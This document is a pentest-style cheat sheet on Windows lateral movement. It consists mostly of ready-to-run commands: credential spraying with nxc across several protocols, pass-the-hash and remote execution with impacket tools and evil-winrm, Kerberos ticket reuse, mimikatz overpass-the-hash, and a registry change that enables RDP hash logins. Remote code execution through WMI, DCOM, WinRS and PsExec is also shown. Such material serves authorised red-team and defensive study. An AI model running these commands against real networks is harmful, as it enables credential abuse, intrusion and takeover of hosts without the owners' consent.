# Lateral movement checks

Match access to the open service: WMI/DCOM 135 · WinRM 5985/5986 · SMB exec 445 + admin + usable share. Test identity first (authentication ≠ command execution).

## Credential sweep
Every new cred × every host × every protocol. `(Pwn3d!)` = exec works.
```bash
for p in smb winrm rdp mssql; do nxc $p <TARGETS> -u <USER> -p '<PW>' --continue-on-success; done
for p in smb winrm rdp mssql; do nxc $p <TARGETS> -u <USER> -H <NT> --continue-on-success; done
for p in smb winrm rdp mssql; do nxc $p <TARGETS> -u <USER> -p '<PW>' --local-auth --continue-on-success; done
nxc ssh <TARGETS> -u <USER> -p '<PW>' --continue-on-success
```
- `<TARGETS>` = IP, CIDR or a hosts file. Lockout and spraying: [online-logins.md](../passwords/online-logins.md).
- `--local-auth` = local SAM account; without it the domain is used. Not available for ssh.

## Execution-method matrix
| Tool | Ports | Needs | Runs as | Notes |
| --- | --- | --- | --- | --- |
| `impacket-psexec` | 445 | local admin, writable `ADMIN$` | SYSTEM | uploads a service binary: loudest, Defender kills it |
| `impacket-smbexec` | 445 | local admin, `C$` | SYSTEM | service per command, no binary dropped |
| `impacket-atexec` | 445 | local admin | SYSTEM | one command via scheduled task, no shell |
| `impacket-wmiexec` | 135 + RPC, 445 | local admin | user | output via `ADMIN$`; quietest default |
| `impacket-dcomexec` | 135 + RPC, 445 | local admin | user | `-object MMC20` (or `ShellWindows`, `ShellBrowserWindow`) |
| `evil-winrm` | 5985/5986 | admin or Remote Management Users | user | no SMB needed |

## Password or NT hash
```bash
evil-winrm -i <IP> -u <USER> -p '<PW>'
impacket-wmiexec <DOMAIN.TLD>/<USER>:<PW>@<IP>
evil-winrm -i <IP> -u <USER> -H <NT>
impacket-wmiexec -hashes :<NT> <DOMAIN.TLD>/<USER>@<IP>
```
- Pass the Hash needs an NT hash + an NTLM service. NetNTLMv2 is not passable.

## Other impacket exec tools
```bash
impacket-psexec <DOMAIN.TLD>/<USER>:'<PW>'@<IP>
impacket-psexec -hashes :<NT> <DOMAIN.TLD>/<USER>@<IP>
impacket-smbexec -hashes :<NT> <DOMAIN.TLD>/<USER>@<IP>
impacket-atexec -hashes :<NT> <DOMAIN.TLD>/<USER>@<IP> 'whoami'
impacket-dcomexec -object MMC20 -hashes :<NT> <DOMAIN.TLD>/<USER>@<IP>
```
- Swap `-hashes :<NT>` for `<USER>:'<PW>'` in the target string for password auth. `-shell-type powershell` on smbexec / wmiexec / dcomexec.

## nxc exec
```bash
nxc smb <TARGETS> -u <USER> -p '<PW>' -x 'whoami'
nxc smb <TARGETS> -u <USER> -H <NT> -X 'whoami /priv'
nxc smb <TARGETS> -u <USER> -H <NT> -x 'whoami' --exec-method smbexec
nxc winrm <TARGETS> -u <USER> -p '<PW>' -X 'whoami /priv'
nxc mssql <TARGETS> -u <USER> -p '<PW>' -x 'whoami'
```
- smb `--exec-method`: `wmiexec` (default), `smbexec`, `atexec`, `mmcexec`. Try the next when one fails.

## Kerberos ticket
```bash
impacket-getTGT <DOMAIN.TLD>/<USER> -hashes :<NT>
export KRB5CCNAME=<USER>.ccache
impacket-psexec -k -no-pass <DOMAIN.TLD>/<USER>@<FQDN>
```
- Keep the cache tied to its account. TGS is SPN-specific: failure → FQDN, SPN, DNS, clock.

## Login works, no exec
| Symptom | Cause | Fix |
| --- | --- | --- |
| `[+]` but no `(Pwn3d!)` | not admin on that host | try winrm / rdp / mssql, look for other creds |
| local admin (not RID-500) gets access denied on exec | UAC remote filtering, [uac.md](../windows/uac.md) | RID-500 `Administrator` hash or a domain admin |
| winrm fails with valid creds | not in Remote Management Users, or 5985 closed | smb / wmi exec |
| psexec hangs or service not started | Defender removed the service binary | wmiexec, smbexec, evil-winrm |
| wmiexec times out | 135 or dynamic RPC blocked | smbexec / atexec (445 only) |

## RDP with a hash
```bash
xfreerdp3 /v:<IP> /u:<USER> /d:<DOMAIN> /pth:<NT> /cert:ignore
```
Restricted Admin must be enabled; with admin exec on the host (any method above):
```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```
- `/pth` forces Restricted Admin mode. The user still needs RDP rights (admin or Remote Desktop Users).

## Overpass-the-hash (Windows)
NT hash → Kerberos TGT in a new process. Use hostnames, not IPs.
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<USER> /domain:<DOMAIN.TLD> /ntlm:<NT> /run:powershell.exe" "exit"
```
```powershell
dir \\<FQDN>\C$
.\PsExec64.exe \\<FQDN> cmd
```
- `klist` in the new window is empty until the first Kerberos access. Rubeus `asktgt /rc4:<NT> /ptt`: [tickets.md](tickets.md#rubeus-windows).

## Direct WMI (PowerShell)
```powershell
$password = ConvertTo-SecureString '<PW>' -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $password)
$options = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName <IP> -Credential $credential -SessionOption $options
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = 'cmd /c hostname'}
```

## Windows-side alternatives
WinRS / PS remoting → WinRM. PsExec → SMB + service-control access.
```cmd
winrs -r:<FQDN> -u:<DOMAIN>\<USER> -p:<PW> "cmd /c hostname & whoami"
```
```powershell
$password = ConvertTo-SecureString '<PW>' -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $password)
$session = New-PSSession -ComputerName <FQDN> -Credential $credential
Enter-PSSession $session
```
```powershell
.\PsExec64.exe \\<FQDN> -u <DOMAIN>\<USER> -p <PW> cmd
```
DCOM/MMC (local admin + RPC; process may run in session 0 → use a file-output proof):
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1', '<FQDN>'))
$dcom.Document.ActiveView.ExecuteShellCommand('cmd', $null, '/c hostname > C:\Windows\Temp\dcom-check.txt', '7')
```
